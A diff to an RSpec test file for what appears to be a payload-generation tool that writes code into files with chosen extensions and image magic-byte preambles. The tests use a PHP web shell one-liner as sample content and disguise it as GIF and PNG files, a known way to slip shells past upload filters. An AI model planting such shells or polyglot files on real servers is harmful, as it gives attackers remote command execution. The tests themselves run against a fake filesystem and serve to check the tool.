@@ -12,9 +12,26 @@ describe GenerateOutputFileAction do
   end
 
   it 'creates a different file containing the product code and a random name' do
-    code = '<?php system($_REQUEST["cmd"]); ?>'
+    code = '<?php system($_POST["commnad"]); ?>'
     extension = 'php7'
     run_creates_file_scenario(code, extension)
+  end
+
+  it 'creates a file including the specified preamble' do
+    code = '<?php system($_REQUEST["cmd"]); ?>'
+    preamble = '474946' # Gif file magic bytes
+    extension = 'gif'
+    run_creates_file_with_preamble_scenario(code, preamble, extension)
+  end
+
+  it 'creates a file with a different preamble' do
+    # Create the preamble for a 1x1 white PNG'
+    code = '<?php system($_REQUEST["cmd"]); ?>'
+    preamble = '89504e470d0a1a0a0000000d494844520000000100000001010000000037'\
+               '6ef9240000000a4944415408d76368000000820081dd436af40000000049'\
+               '454e44ae426082'
+    extension = 'png'
+    run_creates_file_with_preamble_scenario(code, preamble, extension)
   end
 end
 
@@ -43,6 +60,33 @@ def run_creates_file_scenario(code, extension)
     # Expect the file to have been created
     File.open("#{filename}.#{extension}", 'r') do |f|
       expect(f.read).to eq(code)
+    end
+  end
+end
+
+def run_creates_file_with_preamble_scenario(code, preamble, extension)
+  # Mock the SecureRandom's module hex method
+  filename = Random.hex(32)
+  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)
+
+  # Create a virtual filesystem
+  FakeFS.with_fresh do
+    # Create a product
+    product = Product.new
+    product.code = code
+
+    # Create and run the action
+    file_info = FileInfo.new(extension, preamble)
+    action = GenerateOutputFileAction.new(file_info)
+    action.transform(product)
+
+    # Create the expected content for the file
+    expected_content = [preamble].pack('H*')
+    expected_content << code
+
+    # Open the file and compare the actual with the expected content
+    File.open("#{filename}.#{extension}", 'r+b') do |f|
+      expect(f.read).to eq(expected_content)
     end
   end
 end
